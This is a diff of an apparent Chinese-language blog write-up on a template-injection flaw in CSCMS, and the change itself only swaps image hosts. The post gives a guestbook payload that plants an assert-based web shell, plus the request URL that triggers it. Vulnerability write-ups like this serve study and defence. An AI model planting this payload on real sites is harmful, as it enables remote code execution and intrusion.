@@ -123,26 +123,26 @@
 <ul>
 <li>我们追踪<code>cscms_php</code>在<code>template_parse</code>这个方法中进行了调用，但是这里进行了过滤，这样类型的是可以执行的：<code>{cscmsphp}phpinfo();{/cscmsphp}</code>追踪<code>$str</code>是<code>template_parse</code>的传入参数，我们再继续追踪<code>template_parse</code></li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191129/1575037851193.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/1575037851193.png" alt="img"></p>
 <ul>
 <li>经过一段时间的查找，<code>gbook_list</code>类方法调用了<code>template_parse</code></li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191129/15750381995978.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750381995978.png" alt="img"></p>
 <ul>
 <li>我们追踪<code>$Mark_Text</code>发现它是由<code>$data_content</code>经过替换得到。那么我们继续追踪<code>$data_content</code></li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191129/15750384557070.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750384557070.png" alt="img"></p>
 <ul>
 <li>从下面代码我们可以简单知道<code>$data_content</code>是由一个数组得到的，而这个数组是通过查询数据库得到的。这里就可以得到一个思路，就是通过留言板把payload写入数据库，而后<code>gbook_list</code>会把payload拿出来去渲染，因为这里无论内容有哪些最终在传到<code>cscms_php</code>这个类方法时候都会获取到payload。</li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191129/15750386263446.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750386263446.png" alt="img"></p>
 <ul>
 <li>留言处插入如下payload</li>
 </ul>
 <pre><code>{cscmsphp}assert($_REQUEST[pwd]);{/cscmsphp}</code></pre><ul>
 <li>访问：</li>
 </ul>
-<pre><code>http://www.tp5.com/index.php/gbook/lists/1?pwd=phpinfo();</code></pre><p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191129/15750393335223.png" alt="img"></p>
+<pre><code>http://www.tp5.com/index.php/gbook/lists/1?pwd=phpinfo();</code></pre><p><img src="http://goodcheerleung.gitee.io/mycute/20191129/15750393335223.png" alt="img"></p>
 
 	</div>
 	<div class="meta split">
